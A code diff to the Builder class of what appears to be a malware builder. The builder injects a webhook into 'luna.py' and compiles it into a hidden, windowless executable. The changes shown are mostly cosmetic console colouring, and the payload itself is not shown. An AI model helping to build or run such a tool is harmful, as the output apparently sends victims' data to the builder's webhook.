@@ -48,14 +48,12 @@ class Builder:
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Built!')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Built!{Fore.RESET}')
 
         run = input(
             f'\n\n\n{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test run the file? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
-
-        input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press enter to exit...')
 
     def loading(self):
         p = Fore.MAGENTA + Style.DIM
@@ -140,7 +138,7 @@ class Builder:
 
         for file in required_files:
             if not os.path.isfile(file):
-                print(f'{Fore.RED}[!]{Fore.RESET} {file} not found!')
+                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!')
                 return False
 
         try:
@@ -151,7 +149,7 @@ class Builder:
             print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))
 
         except subprocess.CalledProcessError:
-            print(f'{Fore.RED}[!]{Fore.RESET} Python not found!')
+            print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!')
             return False
 
         os.system('pip install --upgrade -r requirements.txt')
@@ -163,7 +161,7 @@ class Builder:
         return True
 
     def mk_file(self, filename, webhook):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Generating source code...')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
 
         with open('./luna.py', 'r', encoding="utf-8") as f:
             code = f.read()
@@ -177,12 +175,12 @@ class Builder:
             self.compile(filename)
         else:
             time.sleep(2)
-            print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Source code has been generated...')
-            input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press enter to exit...')
+            print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
+            input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
             sys.exit()
 
     def compile(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Compiling code...')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
         
         os.system(
             f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
@@ -194,18 +192,18 @@ class Builder:
             try:
                 if os.path.isdir(clean):
                     shutil.rmtree(clean)
-                    print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {clean} removed!')
+                    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} {clean} removed!{Fore.RESET}')
             except Exception:
-                print(f'{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} {clean} not found!')
+                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}]{Fore.RESET}{Fore.WHITE} {clean} not found!{Fore.RESET}')
                 continue
 
         for clean in cleans_file:
             try:
                 if os.path.isfile(clean):
                     os.remove(clean)
-                    print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {clean} removed!')
+                    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} {clean} removed!{Fore.RESET}')
             except Exception:
-                print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
+                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}]{Fore.RESET}{Fore.WHITE} {clean} not found!{Fore.RESET}')
                 continue
 
     def run(self, filename):
